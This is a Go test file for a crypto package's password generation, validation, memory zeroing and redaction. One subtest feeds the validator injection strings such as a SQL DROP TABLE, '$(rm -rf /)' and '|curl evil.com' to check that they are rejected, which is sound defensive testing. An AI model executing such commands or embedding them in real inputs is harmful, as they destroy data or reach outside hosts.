package crypto

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"unicode"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

// TestPasswordGenerationSecurity tests the security properties of password generation
func TestPasswordGenerationSecurity(t *testing.T) {
	t.Run("entropy_validation", func(t *testing.T) {
		// Generate large number of passwords to test entropy
		passwords := make(map[string]bool)
		const numPasswords = 1000

		for i := 0; i < numPasswords; i++ {
			pwd, err := GeneratePassword(20)
			testutil.AssertNoError(t, err)

			// Check for duplicates (should be extremely rare with good entropy)
			if passwords[pwd] {
				t.Errorf("Generated duplicate password: %s", pwd)
			}
			passwords[pwd] = true

			// Validate password complexity
			validatePasswordComplexityExtended(t, pwd)
		}

		// Verify we got the expected number of unique passwords
		testutil.AssertEqual(t, numPasswords, len(passwords))
	})

	t.Run("character_distribution", func(t *testing.T) {
		// Test character class distribution in generated passwords
		const numTests = 100
		const passwordLength = 24

		upperCount := 0
		lowerCount := 0
		digitCount := 0
		specialCount := 0

		for i := 0; i < numTests; i++ {
			pwd, err := GeneratePassword(passwordLength)
			testutil.AssertNoError(t, err)

			// Count character classes
			for _, r := range pwd {
				switch {
				case unicode.IsUpper(r):
					upperCount++
				case unicode.IsLower(r):
					lowerCount++
				case unicode.IsDigit(r):
					digitCount++
				default:
					specialCount++
				}
			}
		}

		totalChars := numTests * passwordLength

		// Each character class should represent a reasonable percentage
		// (allowing for randomness but ensuring no class is completely missing)
		if upperCount < totalChars/20 { // At least 5%
			t.Errorf("Insufficient uppercase characters: %d/%d (%.1f%%)", upperCount, totalChars, float64(upperCount)/float64(totalChars)*100)
		}
		if lowerCount < totalChars/20 {
			t.Errorf("Insufficient lowercase characters: %d/%d (%.1f%%)", lowerCount, totalChars, float64(lowerCount)/float64(totalChars)*100)
		}
		if digitCount < totalChars/20 {
			t.Errorf("Insufficient digits: %d/%d (%.1f%%)", digitCount, totalChars, float64(digitCount)/float64(totalChars)*100)
		}
		if specialCount < totalChars/20 {
			t.Errorf("Insufficient special characters: %d/%d (%.1f%%)", specialCount, totalChars, float64(specialCount)/float64(totalChars)*100)
		}
	})

	t.Run("length_boundaries", func(t *testing.T) {
		// Test minimum length enforcement
		_, err := GeneratePassword(MinPasswordLen - 1)
		testutil.AssertError(t, err)

		// Test minimum length
		pwd, err := GeneratePassword(MinPasswordLen)
		testutil.AssertNoError(t, err)
		testutil.AssertEqual(t, MinPasswordLen, len(pwd))

		// Test various lengths
		lengths := []int{16, 24, 32, 64, 128}
		for _, length := range lengths {
			pwd, err := GeneratePassword(length)
			testutil.AssertNoError(t, err)
			testutil.AssertEqual(t, length, len(pwd))
			validatePasswordComplexityExtended(t, pwd)
		}
	})

	t.Run("no_predictable_patterns", func(t *testing.T) {
		// Generate multiple passwords and check for predictable patterns
		passwords := make([]string, 50)
		for i := range passwords {
			pwd, err := GeneratePassword(20)
			testutil.AssertNoError(t, err)
			passwords[i] = pwd
		}

		// Check for sequential characters (should be rare)
		for _, pwd := range passwords {
			sequentialCount := 0
			for i := 1; i < len(pwd); i++ {
				if pwd[i] == pwd[i-1]+1 {
					sequentialCount++
				}
			}
			// Allow some sequential characters due to randomness, but not too many
			if sequentialCount > len(pwd)/4 {
				t.Errorf("Password has too many sequential characters: %s (count: %d)", pwd, sequentialCount)
			}
		}

		// Check for repeated characters (should be limited)
		for _, pwd := range passwords {
			charCount := make(map[rune]int)
			for _, r := range pwd {
				charCount[r]++
			}
			for char, count := range charCount {
				if count > len(pwd)/3 { // No character should appear more than 1/3 of the time
					t.Errorf("Password has too many repeated characters '%c': %s (count: %d)", char, pwd, count)
				}
			}
		}
	})
}

// TestPasswordValidationSecurityExtended tests password validation for security properties
func TestPasswordValidationSecurityExtended(t *testing.T) {
	ctx := context.Background()

	t.Run("common_password_rejection", func(t *testing.T) {
		// Test that common/weak passwords are rejected
		commonPasswords := []string{
			"password",
			"123456",
			"qwerty", 
			"abc123",
			"password123",
			"admin",
			"letmein",
			"welcome",
			"monkey",
			"dragon",
			"sunshine",
			"iloveyou",
			"trustno1",
			"starwars",
			"Pokemon123", // Mixed case but still common
		}

		for _, pwd := range commonPasswords {
			err := ValidateStrongPassword(ctx, pwd)
			testutil.AssertError(t, err)
			testutil.AssertContains(t, err.Error(), "password")
		}
	})

	t.Run("injection_attempt_rejection", func(t *testing.T) {
		// Test that passwords containing injection attempts are rejected
		injectionPasswords := []string{
			"password'; DROP TABLE users; --",
			"pass$(rm -rf /)",
			"admin`whoami`",
			"secret|curl evil.com",
			"pwd;shutdown -h now",
			"test\nrm -rf /",
			"pass\x00word",
			"admin\\x27",
		}

		for _, pwd := range injectionPasswords {
			err := ValidateStrongPassword(ctx, pwd)
			// These should either be rejected for being weak or for containing dangerous characters
			testutil.AssertError(t, err)
		}
	})

	t.Run("unicode_attack_rejection", func(t *testing.T) {
		// Test that Unicode-based attacks are handled properly
		unicodePasswords := []string{
			"password\u200B123",  // Zero-width space
			"admin\uFF1Btest",    // Fullwidth semicolon
			"secret\u202Etest",   // RTL override
			"pwd\u0000test",      // Null byte
			"tеst123!@#",         // Cyrillic е instead of e
		}

		for _, pwd := range unicodePasswords {
			err := ValidateStrongPassword(ctx, pwd)
			// Should be rejected - either as weak or containing problematic characters
			testutil.AssertError(t, err)
		}
	})

	t.Run("length_boundary_validation", func(t *testing.T) {
		// Test length boundaries
		shortPasswords := []string{
			"",
			"a",
			"abc",
			"Abc1!",          // 5 chars
			"Abc123!",        // 7 chars  
			"Abcdef1!",       // 8 chars
			"Abcdefgh1!",     // 10 chars
		}

		for _, pwd := range shortPasswords {
			err := ValidateStrongPassword(ctx, pwd)
			testutil.AssertError(t, err)
			if !strings.Contains(err.Error(), "length") && !strings.Contains(err.Error(), "short") {
				t.Errorf("Expected length-related error for password: %s, got: %v", pwd, err)
			}
		}

		// Test minimum acceptable password
		minValidPassword := "Abcdefgh123!"
		if len(minValidPassword) >= MinPasswordLen {
			err := ValidateStrongPassword(ctx, minValidPassword)
			testutil.AssertNoError(t, err)
		}
	})

	t.Run("complexity_requirements", func(t *testing.T) {
		// Test passwords missing complexity requirements
		insufficientPasswords := []struct {
			password string
			missing  string
		}{
			{"abcdefghijklmnop", "uppercase"},
			{"ABCDEFGHIJKLMNOP", "lowercase"},
			{"AbcdefghijklmnoP", "digit"},
			{"Abcdefghijklm123", "special"},
			{"ABC123!@#$%^&*()", "lowercase"},
			{"abc123!@#$%^&*()", "uppercase"},
		}

		for _, tc := range insufficientPasswords {
			err := ValidateStrongPassword(ctx, tc.password)
			testutil.AssertError(t, err)
			// Error should mention the missing complexity requirement
			errorMsg := strings.ToLower(err.Error())
			if !strings.Contains(errorMsg, "uppercase") && !strings.Contains(errorMsg, "lowercase") &&
				!strings.Contains(errorMsg, "digit") && !strings.Contains(errorMsg, "special") &&
				!strings.Contains(errorMsg, "complexity") {
				t.Errorf("Expected complexity-related error for password missing %s: %s, got: %v", tc.missing, tc.password, err)
			}
		}
	})

	t.Run("valid_strong_passwords", func(t *testing.T) {
		// Test that legitimately strong passwords are accepted
		strongPasswords := []string{
			"MyVerySecure!Password123",
			"Tr0ub4dor&3",
			"correcthorsebatterystaple123!A",
			"P@ssw0rd!StrongEnough2024",
			"MyComplex&Password#1",
			"Secure123!@#Password",
		}

		for _, pwd := range strongPasswords {
			err := ValidateStrongPassword(ctx, pwd)
			testutil.AssertNoError(t, err)
			validatePasswordComplexityExtended(t, pwd)
		}
	})
}

// TestPasswordMemorySecurity tests secure handling of passwords in memory
func TestPasswordMemorySecurity(t *testing.T) {
	t.Run("secure_zero_functionality", func(t *testing.T) {
		// Test that SecureZero actually zeroes memory
		sensitiveData := []byte("very secret password data")
		original := make([]byte, len(sensitiveData))
		copy(original, sensitiveData)

		// Verify data is initially present
		testutil.AssertEqual(t, string(original), string(sensitiveData))

		// Zero the memory
		SecureZero(sensitiveData)

		// Verify data is zeroed
		for i, b := range sensitiveData {
			if b != 0 {
				t.Errorf("SecureZero failed to zero byte at index %d: got %d, want 0", i, b)
			}
		}

		// Verify original is unchanged (to confirm we're testing the right thing)
		if string(original) == string(sensitiveData) {
			t.Error("Test setup error: original and sensitiveData should be different after zeroing")
		}
	})

	t.Run("secure_zero_edge_cases", func(t *testing.T) {
		// Test edge cases
		testCases := [][]byte{
			{},                    // Empty slice
			{0},                   // Already zero
			{255},                 // Max byte value
			{1, 2, 3, 4, 5},      // Small slice
			make([]byte, 1000),    // Large slice
		}

		for i, data := range testCases {
			SecureZero(data)
			for j, b := range data {
				if b != 0 {
					t.Errorf("Test case %d: SecureZero failed to zero byte at index %d: got %d, want 0", i, j, b)
				}
			}
		}
	})

	t.Run("password_generation_cleanup", func(t *testing.T) {
		// This is more of a documentation test - ensure password generation
		// doesn't leave sensitive data in memory longer than necessary
		pwd, err := GeneratePassword(32)
		testutil.AssertNoError(t, err)
		
		// Convert to bytes for zeroing
		pwdBytes := []byte(pwd)
		
		// Verify we can zero the password data
		SecureZero(pwdBytes)
		
		for i, b := range pwdBytes {
			if b != 0 {
				t.Errorf("Failed to zero password byte at index %d: got %d, want 0", i, b)
			}
		}
	})
}

// TestPasswordRedactionSecurity tests that passwords are properly redacted in logs
func TestPasswordRedactionSecurity(t *testing.T) {
	t.Run("redaction_effectiveness", func(t *testing.T) {
		// Test various password-like strings
		sensitiveStrings := []string{
			"MySecretPassword123!",
			"password123",
			"admin",
			"secret",
			"token",
			"key",
			"credential",
			"passphrase",
		}

		for _, sensitive := range sensitiveStrings {
			redacted := Redact(sensitive)
			
			// Redacted version should not contain the original
			if redacted == sensitive {
				t.Errorf("Redact failed to redact sensitive string: %s", sensitive)
			}
			
			// Should return a safe placeholder
			if redacted != "[REDACTED]" && !strings.Contains(redacted, "*") {
				t.Errorf("Redact returned unexpected format: %s -> %s", sensitive, redacted)
			}
		}
	})

	t.Run("non_sensitive_passthrough", func(t *testing.T) {
		// Test that non-sensitive strings are passed through
		nonSensitiveStrings := []string{
			"hello",
			"world",
			"test",
			"data",
			"example",
		}

		for _, str := range nonSensitiveStrings {
			redacted := Redact(str)
			// Non-sensitive strings might be passed through or redacted depending on implementation
			// Just ensure it doesn't crash and returns something reasonable
			if redacted == "" {
				t.Errorf("Redact returned empty string for: %s", str)
			}
		}
	})
}

// validatePasswordComplexityExtended is a helper function to validate password complexity
func validatePasswordComplexityExtended(t *testing.T, password string) {
	t.Helper()

	hasUpper := false
	hasLower := false
	hasDigit := false
	hasSpecial := false

	for _, r := range password {
		switch {
		case unicode.IsUpper(r):
			hasUpper = true
		case unicode.IsLower(r):
			hasLower = true
		case unicode.IsDigit(r):
			hasDigit = true
		case unicode.IsPunct(r) || unicode.IsSymbol(r):
			hasSpecial = true
		}
	}

	if !hasUpper {
		t.Errorf("Password missing uppercase character: %s", password)
	}
	if !hasLower {
		t.Errorf("Password missing lowercase character: %s", password)
	}
	if !hasDigit {
		t.Errorf("Password missing digit: %s", password)
	}
	if !hasSpecial {
		t.Errorf("Password missing special character: %s", password)
	}

	if len(password) < MinPasswordLen {
		t.Errorf("Password too short: %d < %d", len(password), MinPasswordLen)
	}
}

// BenchmarkPasswordGeneration benchmarks password generation performance
func BenchmarkPasswordGeneration(b *testing.B) {
	lengths := []int{12, 16, 24, 32, 64}
	
	for _, length := range lengths {
		b.Run(fmt.Sprintf("length_%d", length), func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				_, err := GeneratePassword(length)
				if err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}

// BenchmarkPasswordValidation benchmarks password validation performance
func BenchmarkPasswordValidation(b *testing.B) {
	ctx := context.Background()
	passwords := []string{
		"WeakPassword",
		"StrongPassword123!",
		"VeryLongAndComplexPassword123!@#$%^&*()",
		"password", // Common password
	}

	for _, pwd := range passwords {
		b.Run(fmt.Sprintf("validate_%s", strings.ReplaceAll(pwd, "!", "_")), func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				_ = ValidateStrongPassword(ctx, pwd)
			}
		})
	}
}

// TestPasswordSecurityConstants tests that security constants are appropriately set
func TestPasswordSecurityConstants(t *testing.T) {
	t.Run("minimum_length_security", func(t *testing.T) {
		// Modern security standards recommend at least 12-14 characters
		if MinPasswordLen < 12 {
			t.Errorf("MinPasswordLen too low for security: %d (recommended: 12+)", MinPasswordLen)
		}
		
		// Warn if below current best practices
		if MinPasswordLen < 14 {
			t.Logf("Warning: MinPasswordLen is %d, modern best practice is 14+", MinPasswordLen)
		}
	})
}